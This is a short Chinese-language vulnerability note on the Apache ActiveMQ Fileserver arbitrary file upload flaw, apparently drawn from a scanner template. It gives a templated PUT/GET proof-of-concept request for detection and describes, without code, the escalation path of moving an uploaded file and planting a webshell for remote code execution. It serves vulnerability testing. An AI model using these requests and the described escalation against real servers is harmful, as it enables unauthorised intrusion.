验证漏洞存在方法
    - 通过HTTP PUT请求上传文件到/fileserver/目录
    - 通过HTTP GET请求验证文件是否成功上传

漏洞利用方法
    - Apache ActiveMQ 5.x before 5.14.0版本中的Fileserver web应用存在任意文件上传漏洞
    - 攻击者可以通过HTTP PUT请求上传任意文件到fileserver目录
    - 然后通过HTTP MOVE请求将上传的文件移动到任意位置
    - 这可能导致远程代码执行，攻击者可以上传webshell等恶意文件
    - PoC：
      ```
      PUT /fileserver/{{randstr}}.txt HTTP/1.1
      Host: {{Hostname}}
      
      {{rand1}}
      
      GET /fileserver/{{randstr}}.txt HTTP/1.1
      Host: {{Hostname}}
      ```
